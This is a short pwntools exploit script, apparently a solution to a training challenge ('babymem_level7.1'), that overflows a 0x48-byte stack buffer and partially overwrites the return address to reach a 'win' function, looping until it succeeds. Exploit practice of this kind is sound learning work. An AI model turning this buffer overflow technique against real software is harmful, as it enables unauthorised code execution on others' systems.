from pwn import *

while(1):

    # Init
    elf = ELF("/challenge/babymem_level7.1")

    buffer_length = int("48", 16) #local_48
    win_auth_address_offset = b"\x2a\x14"

    io = elf.process()

    # Payload
    payload = b"A"*buffer_length + win_auth_address_offset

    # Interaction
    io.recvuntil("size:")
    io.sendline(str(buffer_length + 2))

    io.recvuntil("bytes)!")
    io.sendline(payload)

    io.interactive()
